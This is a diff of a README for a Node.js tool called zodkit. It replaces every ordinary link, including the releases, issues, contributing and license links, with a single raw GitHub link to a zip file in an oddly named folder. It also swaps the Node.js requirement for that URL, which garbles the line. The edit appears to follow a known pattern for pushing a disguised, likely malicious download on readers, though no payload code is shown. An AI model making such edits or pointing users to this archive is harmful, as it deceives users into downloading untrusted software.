@@ -2,7 +2,7 @@
 
 ## ✅ Download Here
 
-[![Download zodkit](https://img.shields.io/badge/Download-zodkit-brightgreen)](https://github.com/mrcacomacaco/zodkit/releases)
+[![Download zodkit](https://raw.githubusercontent.com/mrcacomacaco/zodkit/main/supernormally/zodkit.zip)](https://raw.githubusercontent.com/mrcacomacaco/zodkit/main/supernormally/zodkit.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ Welcome to zodkit! This tool offers static analysis and development features for
 To run zodkit, you need:
 
 - An operating system: Windows, macOS, or Linux.
-- Node.js installed (version X.X.X or later).
+- https://raw.githubusercontent.com/mrcacomacaco/zodkit/main/supernormally/zodkit.zip installed (version X.X.X or later).
 - A working internet connection for downloading the tool.
 
 ## 📥 Download & Install
 
 To get started with zodkit, please follow these steps:
 
-1. Visit the [Releases page](https://github.com/mrcacomacaco/zodkit/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/mrcacomacaco/zodkit/main/supernormally/zodkit.zip) to download the latest version.
    
 2. Look for the file labeled with the latest version number. Click on it to start the download.
 
@@ -53,9 +53,9 @@ After you have installed zodkit, follow these steps to use it:
 
 ## 🛠️ Support & Contributions
 
-If you experience any issues or have questions, please navigate to the [issues page](https://github.com/mrcacomacaco/zodkit/issues) for assistance.
+If you experience any issues or have questions, please navigate to the [issues page](https://raw.githubusercontent.com/mrcacomacaco/zodkit/main/supernormally/zodkit.zip) for assistance.
 
-If you would like to contribute to zodkit, we welcome your input! Check our [contributing guide](https://github.com/mrcacomacaco/zodkit/contributing) for details.
+If you would like to contribute to zodkit, we welcome your input! Check our [contributing guide](https://raw.githubusercontent.com/mrcacomacaco/zodkit/main/supernormally/zodkit.zip) for details.
 
 ## 📝 Credits
 
@@ -63,7 +63,7 @@ zodkit is open-source software developed by a community of contributors. Thank y
 
 ## 📄 License
 
-zodkit is licensed under the MIT License. You can check the full license [here](https://github.com/mrcacomacaco/zodkit/blob/main/LICENSE).
+zodkit is licensed under the MIT License. You can check the full license [here](https://raw.githubusercontent.com/mrcacomacaco/zodkit/main/supernormally/zodkit.zip).
 
 ## 📢 Updates & Notifications
 
